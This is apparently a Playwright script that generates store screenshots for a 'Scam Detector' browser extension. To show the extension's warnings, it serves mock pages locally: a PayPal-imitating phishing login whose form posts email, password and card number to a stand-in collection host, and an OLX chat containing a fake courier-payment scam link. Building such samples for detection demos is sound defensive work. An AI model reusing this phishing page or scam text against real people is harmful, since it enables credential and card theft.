/*
 * Generates the store assets. Uses the bundled Chromium with the unpacked extension
 * loaded. Run: node tools/store-assets.js
 *   store-listing/assets/          Chrome Web Store: screenshot-1..4 (1280x800),
 *                                  promo-small-440x280.png, promo-marquee-1400x560.png
 *   store-listing/assets-firefox/  Firefox Add-ons: the same screenshots (AMO shows
 *                                  1280x800) and icon-128x128.png. AMO has no promo tiles.
 */
const path = require('path');
const fs = require('fs');
const { chromium } = require('playwright');

const EXT = path.resolve(__dirname, '..');
const OUT = path.join(EXT, 'store-listing', 'assets');
const OUT_FF = path.join(EXT, 'store-listing', 'assets-firefox');
fs.mkdirSync(OUT, { recursive: true });
fs.mkdirSync(OUT_FF, { recursive: true });
const ICON = 'data:image/png;base64,' + fs.readFileSync(path.join(EXT, 'icons', 'icon128.png')).toString('base64');

const PHISH_HTML = `<!doctype html><html><head><meta charset="utf-8"><title>Log in to your PayPal account</title>
<link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp258.png">
<style>body{font-family:Helvetica,Arial,sans-serif;background:#f5f7fa;margin:0}.card{background:#fff;max-width:420px;margin:120px auto 0;padding:36px 40px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,.08)}h1{color:#003087;font-size:28px;margin:0 0 6px}p{color:#444}label{display:block;margin:14px 0 4px;font-size:13px;color:#555}input{width:100%;padding:12px;border:1px solid #ccc;border-radius:6px;font-size:15px}button{width:100%;margin-top:18px;padding:13px;background:#0070ba;color:#fff;border:0;border-radius:24px;font-size:16px;font-weight:600}.foot{text-align:center;color:#888;font-size:12px;margin-top:24px}.foot a{color:#888;margin:0 6px}</style></head>
<body><div class="card"><h1>PayPal</h1><p>Your account has been limited. Verify your identity within 24 hours or your account will be suspended.</p>
<form method="post" action="https://collect.evil-host.top/l.php"><label>Email</label><input name="email" type="email" value="">
<label>Password</label><input name="password" type="password"><label>Card number</label><input name="cardnumber"><button>Log In</button></form>
<div class="foot"><a href="#">Help</a><a href="#">Contact</a><a href="#">Fees</a><a href="#">Security</a><a href="#">Privacy</a><a href="#">Legal</a><br><br>© 2026 PayPal Inc.</div></div></body></html>`;

const CHAT_HTML = `<!doctype html><html><head><meta charset="utf-8"><title>OLX - Mensagens</title>
<style>body{font-family:Helvetica,Arial,sans-serif;background:#f2f4f5;margin:0}.top{background:#002f34;color:#fff;padding:14px 32px;font-weight:700;font-size:20px;margin-top:0}.wrap{max-width:760px;margin:110px auto 0;background:#fff;border-radius:10px;padding:20px 24px;box-shadow:0 1px 6px rgba(0,0,0,.08)}h2{font-size:16px;margin:0 0 14px;color:#002f34}.message{max-width:78%;padding:10px 14px;border-radius:14px;margin:8px 0;font-size:15px;line-height:1.45}.in{background:#eef2f3}.out{background:#d7f3e3;margin-left:auto}textarea{width:100%;margin-top:14px;padding:10px;border:1px solid #ccc;border-radius:8px;font:inherit}</style></head>
<body><div class="top">OLX</div><div class="wrap"><h2>Conversa com "Pedro M."</h2>
<div class="chat-thread" data-testid="chat-messages">
<div class="message in">Olá, o artigo ainda está disponível?</div>
<div class="message out">Sim, está disponível.</div>
<div class="message in">Óptimo! Estou fora do país neste momento, mas envio um estafeta para levantar o artigo. O pagamento é feito através da transportadora. Clica no link para receber o pagamento e introduz os dados do cartão: https://olx-entregas-pagamento.com/receber/18273</div>
</div><textarea placeholder="Escreva uma mensagem"></textarea></div></body></html>`;

function frame(title, subtitle, imgDataUrl, imgWidth) {
  return `<!doctype html><html><head><meta charset="utf-8"><style>
  body{margin:0;width:1280px;height:800px;background:linear-gradient(135deg,#1a237e 0%,#b71c1c 100%);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#fff;display:flex;align-items:center;justify-content:center;gap:60px}
  .t{max-width:420px}.t h1{font-size:40px;margin:0 0 14px;line-height:1.15}.t p{font-size:20px;line-height:1.5;opacity:.92;margin:0}
  img.shot{width:${imgWidth}px;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,.45)}
  .logo{display:flex;align-items:center;gap:12px;margin-bottom:26px;font-weight:700;font-size:22px}.logo img{width:44px}
  </style></head><body><div class="t"><div class="logo"><img src="${ICON}">Scam Detector</div><h1>${title}</h1><p>${subtitle}</p></div><img class="shot" src="${imgDataUrl}"></body></html>`;
}

function promo(w, h) {
  const big = w > 1000;
  return `<!doctype html><html><head><meta charset="utf-8"><style>
  body{margin:0;width:${w}px;height:${h}px;background:linear-gradient(135deg,#1a237e 0%,#b71c1c 100%);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#fff;display:flex;align-items:center;justify-content:center;gap:${big ? 48 : 22}px}
  img{width:${big ? 220 : 110}px}h1{font-size:${big ? 64 : 30}px;margin:0 0 ${big ? 14 : 6}px}p{font-size:${big ? 26 : 14}px;margin:0;opacity:.92;max-width:${big ? 640 : 250}px;line-height:1.35}
  </style></head><body><img src="${ICON}"><div><h1>Scam Detector</h1><p>Warns you before a fake login, a brand-new domain or a marketplace chat scam gets your money.</p></div></body></html>`;
}

async function main() {
  const ctx = await chromium.launchPersistentContext('', {
    headless: true, channel: 'chromium', deviceScaleFactor: 1,
    args: [`--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`],
    viewport: { width: 1280, height: 800 },
  });
  try {
    let [sw] = ctx.serviceWorkers();
    if (!sw) sw = await ctx.waitForEvent('serviceworker', { timeout: 15000 });
    const extId = sw.url().split('/')[2];
    await sw.evaluate(async () => {
      const s = (await chrome.storage.sync.get('settings')).settings || {};
      await chrome.storage.sync.set({ settings: Object.assign({}, s, { chatMonitorEnabled: true }) });
    });

    const page = await ctx.newPage();
    await page.route('**/*', (route) => {
      const url = route.request().url();
      if (url.startsWith('https://paypal-secure-login-2026.xyz/')) return route.fulfill({ contentType: 'text/html; charset=utf-8', body: PHISH_HTML });
      if (url.startsWith('https://www.olx.pt/')) return route.fulfill({ contentType: 'text/html; charset=utf-8', body: CHAT_HTML });
      if (url.startsWith('https://www.paypalobjects.com/')) return route.fulfill({ contentType: 'image/png', body: Buffer.alloc(0) });
      return route.abort();
    });

    // 1. Red banner on a phishing page
    await page.goto('https://paypal-secure-login-2026.xyz/signin', { waitUntil: 'domcontentloaded' });
    await page.waitForSelector('#scam-detector-banner-host', { timeout: 20000 });
    await page.waitForTimeout(800);
    await page.screenshot({ path: path.join(OUT, 'screenshot-1-phishing-banner.png') });
    const phishTabId = await sw.evaluate(async () => (await chrome.tabs.query({ url: 'https://paypal-secure-login-2026.xyz/*' }))[0].id);

    // 2. Popup with the signal breakdown (rendered as a framed 1280x800 shot)
    const popup = await ctx.newPage();
    await popup.setViewportSize({ width: 360, height: 640 });
    await popup.goto(`chrome-extension://${extId}/popup/popup.html?tabId=${phishTabId}`);
    await popup.waitForTimeout(1200);
    const popupPng = await popup.screenshot({ fullPage: true });
    const framed = await ctx.newPage();
    await framed.setContent(frame('Every finding, with its weight', 'The popup lists each signal that contributed to the score: domain age, impersonated brand, phishing form patterns, suspicious wording and more.', 'data:image/png;base64,' + popupPng.toString('base64'), 360));
    await framed.waitForTimeout(300);
    await framed.screenshot({ path: path.join(OUT, 'screenshot-2-popup.png') });

    // 3. Chat monitor on a marketplace conversation
    await page.goto('https://www.olx.pt/mensagens/123', { waitUntil: 'domcontentloaded' });
    await page.waitForSelector('#scam-detector-banner-host', { timeout: 20000 });
    await page.waitForTimeout(800);
    await page.screenshot({ path: path.join(OUT, 'screenshot-3-chat-monitor.png') });

    // 4. Settings page
    const options = await ctx.newPage();
    await options.goto(`chrome-extension://${extId}/options/options.html`);
    await options.waitForTimeout(600);
    await options.screenshot({ path: path.join(OUT, 'screenshot-4-settings.png') });

    // Promo tiles
    for (const [w, h, name] of [[440, 280, 'promo-small-440x280.png'], [1400, 560, 'promo-marquee-1400x560.png']]) {
      const p = await ctx.newPage();
      await p.setViewportSize({ width: w, height: h });
      await p.setContent(promo(w, h));
      await p.waitForTimeout(200);
      await p.screenshot({ path: path.join(OUT, name) });
    }
    // Firefox Add-ons: same screenshots, plus the listing icon.
    for (const f of fs.readdirSync(OUT_FF)) if (/\.png$/.test(f)) fs.unlinkSync(path.join(OUT_FF, f));
    for (const f of fs.readdirSync(OUT)) if (/^screenshot-.*\.png$/.test(f)) fs.copyFileSync(path.join(OUT, f), path.join(OUT_FF, f));
    fs.copyFileSync(path.join(EXT, 'icons', 'icon128.png'), path.join(OUT_FF, 'icon-128x128.png'));
    for (const dir of [OUT, OUT_FF]) {
      console.log('assets written to ' + dir);
      for (const f of fs.readdirSync(dir)) console.log('  ' + f);
    }
  } finally {
    await ctx.close();
  }
}

main().catch((e) => { console.error(e); process.exit(1); });
